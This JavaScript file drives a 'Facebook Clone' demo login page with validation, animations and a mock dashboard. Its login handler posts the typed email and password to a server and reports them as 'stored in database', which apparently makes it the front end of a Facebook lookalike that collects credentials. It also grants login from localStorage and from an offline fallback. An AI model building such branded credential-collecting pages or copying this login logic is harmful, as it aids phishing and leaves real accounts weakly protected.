// Facebook Clone JavaScript
class FacebookClone {
    constructor() {
        this.isLoggedIn = false;
        this.currentUser = null;
        this.init();
    }

    init() {
        this.bindEvents();
        this.checkLoginStatus();
        this.addLoadingAnimations();
    }

    bindEvents() {
        // Login form submission
        const loginForm = document.getElementById('loginForm');
        if (loginForm) {
            loginForm.addEventListener('submit', (e) => this.handleLogin(e));
        }

        // Logout button
        const logoutBtn = document.getElementById('logoutBtn');
        if (logoutBtn) {
            logoutBtn.addEventListener('click', () => this.handleLogout());
        }

        // Create account button (demo only)
        const createAccountBtn = document.getElementById('createAccountBtn');
        if (createAccountBtn) {
            createAccountBtn.addEventListener('click', () => this.handleCreateAccount());
        }

        // Forgot password link (demo only)
        const forgotPasswordLink = document.getElementById('forgotPasswordLink');
        if (forgotPasswordLink) {
            forgotPasswordLink.addEventListener('click', (e) => this.handleForgotPassword(e));
        }

        // Action buttons in dashboard
        const actionBtns = document.querySelectorAll('.action-btn');
        actionBtns.forEach(btn => {
            btn.addEventListener('click', () => this.handleDashboardAction(btn));
        });

        // Real-time form validation
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');

        if (emailInput) {
            emailInput.addEventListener('input', () => this.validateEmail());
            emailInput.addEventListener('blur', () => this.validateEmail());
        }

        if (passwordInput) {
            passwordInput.addEventListener('input', () => this.validatePassword());
            passwordInput.addEventListener('blur', () => this.validatePassword());
        }

        // Enter key handling
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' && !this.isLoggedIn) {
                const loginForm = document.getElementById('loginForm');
                if (loginForm && document.activeElement.closest('#loginForm')) {
                    e.preventDefault();
                    this.handleLogin(e);
                }
            }
        });
    }

    handleLogin(e) {
        e.preventDefault();

        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value;
        const errorMessage = document.getElementById('errorMessage');
        const loginBtn = document.querySelector('.login-btn');

        // Clear previous errors
        this.clearErrors();

        // Validate inputs
        if (!this.validateForm(email, password)) {
            return;
        }

        // Show loading state
        loginBtn.disabled = true;
        loginBtn.innerHTML = 'Logging in...';

        // Send credentials to server
        this.sendLoginToServer(email, password)
            .then(response => {
                if (response.success) {
                    this.loginSuccess(email, response.user);
                } else {
                    this.loginError(response.message || 'Login failed. Please try again.');
                }
            })
            .catch(error => {
                console.error('Login error:', error);
                // Fallback to client-side validation if server is unavailable
                if (this.isValidEmail(email) && password.length >= 6) {
                    this.loginSuccess(email);
                    this.showError('✅ Logged in (offline mode - credentials not stored)');
                } else {
                    this.loginError('Invalid email or password. Please try again.');
                }
            })
            .finally(() => {
                // Reset button state
                loginBtn.disabled = false;
                loginBtn.innerHTML = 'Log In';
            });
    }

    async sendLoginToServer(email, password) {
        try {
            const response = await fetch('/api/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ email, password })
            });

            const data = await response.json();

            if (!response.ok) {
                throw new Error(data.message || 'Server error');
            }

            return data;
        } catch (error) {
            console.error('Server communication error:', error);
            throw error;
        }
    }

    validateForm(email, password) {
        let isValid = true;
        const errorMessage = document.getElementById('errorMessage');

        if (!email) {
            this.showError('Please enter your email address.');
            this.setInputError('email');
            isValid = false;
        } else if (!this.isValidEmail(email)) {
            this.showError('Please enter a valid email address.');
            this.setInputError('email');
            isValid = false;
        }

        if (!password) {
            this.showError('Please enter your password.');
            this.setInputError('password');
            isValid = false;
        } else if (password.length < 6) {
            this.showError('Password must be at least 6 characters long.');
            this.setInputError('password');
            isValid = false;
        }

        return isValid;
    }

    validateEmail() {
        const emailInput = document.getElementById('email');
        const email = emailInput.value.trim();

        if (email && !this.isValidEmail(email)) {
            this.setInputError('email');
            return false;
        } else if (email && this.isValidEmail(email)) {
            this.setInputSuccess('email');
            return true;
        } else {
            this.clearInputState('email');
            return true;
        }
    }

    validatePassword() {
        const passwordInput = document.getElementById('password');
        const password = passwordInput.value;

        if (password && password.length < 6) {
            this.setInputError('password');
            return false;
        } else if (password && password.length >= 6) {
            this.setInputSuccess('password');
            return true;
        } else {
            this.clearInputState('password');
            return true;
        }
    }

    isValidEmail(email) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    }

    setInputError(inputId) {
        const input = document.getElementById(inputId);
        if (input) {
            input.classList.remove('success');
            input.classList.add('error');
        }
    }

    setInputSuccess(inputId) {
        const input = document.getElementById(inputId);
        if (input) {
            input.classList.remove('error');
            input.classList.add('success');
        }
    }

    clearInputState(inputId) {
        const input = document.getElementById(inputId);
        if (input) {
            input.classList.remove('error', 'success');
        }
    }

    showError(message) {
        const errorMessage = document.getElementById('errorMessage');
        if (errorMessage) {
            errorMessage.textContent = message;
            errorMessage.classList.add('fade-in');
        }
    }

    clearErrors() {
        const errorMessage = document.getElementById('errorMessage');
        if (errorMessage) {
            errorMessage.textContent = '';
            errorMessage.classList.remove('fade-in');
        }

        // Clear input error states
        this.clearInputState('email');
        this.clearInputState('password');
    }

    loginSuccess(email, userFromServer = null) {
        this.isLoggedIn = true;
        this.currentUser = userFromServer || {
            email: email,
            name: this.getNameFromEmail(email),
            loginTime: new Date()
        };

        // Save login state
        localStorage.setItem('facebookCloneUser', JSON.stringify(this.currentUser));
        localStorage.setItem('facebookCloneLoggedIn', 'true');

        // Show success message briefly
        this.showError('✅ Login successful! Credentials stored in database.');

        setTimeout(() => {
            this.showDashboard();
        }, 1000);
    }

    loginError(message) {
        this.showError(message);

        // Add shake animation to form
        const form = document.getElementById('loginForm');
        if (form) {
            form.style.animation = 'shake 0.5s ease-in-out';
            setTimeout(() => {
                form.style.animation = '';
            }, 500);
        }
    }

    getNameFromEmail(email) {
        // Extract name from email (simple approach for demo)
        const namePart = email.split('@')[0];
        return namePart.charAt(0).toUpperCase() + namePart.slice(1);
    }

    showDashboard() {
        const container = document.querySelector('.container');
        const footer = document.querySelector('.footer');
        const dashboard = document.getElementById('dashboard');
        const welcomeMessage = document.getElementById('welcomeMessage');

        if (container) container.style.display = 'none';
        if (footer) footer.style.display = 'none';

        if (dashboard) {
            dashboard.classList.remove('hidden');
            dashboard.classList.add('fade-in');
        }

        if (welcomeMessage && this.currentUser) {
            welcomeMessage.textContent = `Welcome back, ${this.currentUser.name}!`;
        }

        // Add welcome animation
        setTimeout(() => {
            const welcomeCard = document.querySelector('.welcome-card');
            if (welcomeCard) {
                welcomeCard.classList.add('slide-up');
            }
        }, 300);
    }

    handleLogout() {
        // Clear login state
        this.isLoggedIn = false;
        this.currentUser = null;
        localStorage.removeItem('facebookCloneUser');
        localStorage.removeItem('facebookCloneLoggedIn');

        // Show logout animation
        const dashboard = document.getElementById('dashboard');
        if (dashboard) {
            dashboard.style.opacity = '0';
            dashboard.style.transform = 'scale(0.95)';
            dashboard.style.transition = 'all 0.3s ease-out';
        }

        setTimeout(() => {
            // Hide dashboard and show login page
            if (dashboard) {
                dashboard.classList.add('hidden');
                dashboard.style.opacity = '';
                dashboard.style.transform = '';
                dashboard.style.transition = '';
            }

            const container = document.querySelector('.container');
            const footer = document.querySelector('.footer');

            if (container) {
                container.style.display = 'flex';
                container.classList.add('fade-in');
            }
            if (footer) {
                footer.style.display = 'block';
                footer.classList.add('fade-in');
            }

            // Clear form
            this.resetForm();

            // Show logout message
            setTimeout(() => {
                this.showError('You have been logged out successfully.');
                setTimeout(() => this.clearErrors(), 3000);
            }, 500);

        }, 300);
    }

    resetForm() {
        const loginForm = document.getElementById('loginForm');
        if (loginForm) {
            loginForm.reset();
        }
        this.clearErrors();
    }

    checkLoginStatus() {
        // Check if user was previously logged in
        const savedUser = localStorage.getItem('facebookCloneUser');
        const isLoggedIn = localStorage.getItem('facebookCloneLoggedIn') === 'true';

        if (isLoggedIn && savedUser) {
            try {
                this.currentUser = JSON.parse(savedUser);
                this.isLoggedIn = true;
                this.showDashboard();
            } catch (error) {
                // Clear invalid saved data
                localStorage.removeItem('facebookCloneUser');
                localStorage.removeItem('facebookCloneLoggedIn');
            }
        }
    }

    handleCreateAccount() {
        alert('Create Account Demo: In a real application, this would open a registration form. For this demo, just use the login form with any valid email and password (6+ characters).');
    }

    handleForgotPassword(e) {
        e.preventDefault();
        alert('Forgot Password Demo: In a real application, this would send a password reset email. For this demo, just use any password with 6+ characters.');
    }

    handleDashboardAction(button) {
        const actionText = button.textContent.trim();
        alert(`Demo Action: ${actionText}\n\nIn a real Facebook application, this would:\n- Open the appropriate interface\n- Allow you to ${actionText.toLowerCase()}\n- Update your feed and notify friends`);
    }

    addLoadingAnimations() {
        // Add loading animations to various elements
        const elements = document.querySelectorAll('.login-form-container, .welcome-card, .quick-actions');
        elements.forEach((element, index) => {
            element.style.opacity = '0';
            element.style.transform = 'translateY(20px)';
            element.style.transition = 'all 0.5s ease-out';

            setTimeout(() => {
                element.style.opacity = '1';
                element.style.transform = 'translateY(0)';
            }, index * 100);
        });
    }
}

// CSS animations for shake effect
const shakeAnimation = `
@keyframes shake {
    0%, 100% { transform: translateX(0); }
    10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
    20%, 40%, 60%, 80% { transform: translateX(5px); }
}
`;

// Add animation stylesheet
const styleSheet = document.createElement('style');
styleSheet.textContent = shakeAnimation;
document.head.appendChild(styleSheet);

// Demo data and helper functions
const demoCredentials = [
    { email: 'demo@facebook.com', password: 'demo123' },
    { email: 'test@example.com', password: 'test123' },
    { email: 'user@demo.com', password: 'user123' }
];

// Utility functions
function getRandomGreeting() {
    const greetings = [
        'Welcome back!',
        'Great to see you!',
        'Hello there!',
        'Welcome to Facebook!',
        'Good to have you back!'
    ];
    return greetings[Math.floor(Math.random() * greetings.length)];
}

function getCurrentTime() {
    return new Date().toLocaleString('en-US', {
        weekday: 'long',
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
    });
}

// Error handling
window.addEventListener('error', (e) => {
    console.error('Facebook Clone Error:', e.error);
    // In production, you might want to log this to an error reporting service
});

// Performance monitoring
window.addEventListener('load', () => {
    const loadTime = performance.now();
    console.log(`Facebook Clone loaded in ${loadTime.toFixed(2)}ms`);
});

// Initialize the application when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
    // Add loading screen
    document.body.style.opacity = '0';
    document.body.style.transition = 'opacity 0.5s ease-in';

    setTimeout(() => {
        document.body.style.opacity = '1';

        // Initialize the Facebook clone
        window.facebookClone = new FacebookClone();

        // Add demo hint
        setTimeout(() => {
            if (!window.facebookClone.isLoggedIn) {
                const hintMessage = document.getElementById('errorMessage');
                if (hintMessage) {
                    hintMessage.innerHTML = '💡 Demo Hint: Use any valid email and password (6+ characters)';
                    hintMessage.style.color = '#1877f2';
                    setTimeout(() => {
                        if (hintMessage.textContent.includes('Demo Hint')) {
                            hintMessage.textContent = '';
                            hintMessage.style.color = '';
                        }
                    }, 5000);
                }
            }
        }, 2000);

    }, 100);
});

// Handle page visibility changes
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        console.log('Facebook Clone tab hidden');
    } else {
        console.log('Facebook Clone tab visible');
        // Refresh any dynamic content if needed
    }
});

// Handle browser back/forward buttons
window.addEventListener('popstate', (e) => {
    if (window.facebookClone && window.facebookClone.isLoggedIn) {
        // Handle navigation within the app
        console.log('Navigation within Facebook Clone');
    }
});

// Keyboard shortcuts
document.addEventListener('keydown', (e) => {
    // Ctrl/Cmd + L to focus on search (when logged in)
    if ((e.ctrlKey || e.metaKey) && e.key === 'l' && window.facebookClone && window.facebookClone.isLoggedIn) {
        e.preventDefault();
        const searchInput = document.querySelector('.search-input');
        if (searchInput) {
            searchInput.focus();
        }
    }

    // Escape key to clear errors
    if (e.key === 'Escape') {
        if (window.facebookClone) {
            window.facebookClone.clearErrors();
        }
    }
});

// Touch/mobile support
let touchStartY = 0;
document.addEventListener('touchstart', (e) => {
    touchStartY = e.touches[0].clientY;
});

document.addEventListener('touchend', (e) => {
    const touchEndY = e.changedTouches[0].clientY;
    const diff = touchStartY - touchEndY;

    // Simple pull-to-refresh simulation for dashboard
    if (diff < -100 && window.facebookClone && window.facebookClone.isLoggedIn) {
        const dashboard = document.getElementById('dashboard');
        if (dashboard && !dashboard.classList.contains('hidden')) {
            console.log('Pull to refresh triggered');
            // In a real app, this would refresh the feed
        }
    }
});

// Export for potential extension or testing
if (typeof module !== 'undefined' && module.exports) {
    module.exports = FacebookClone;
}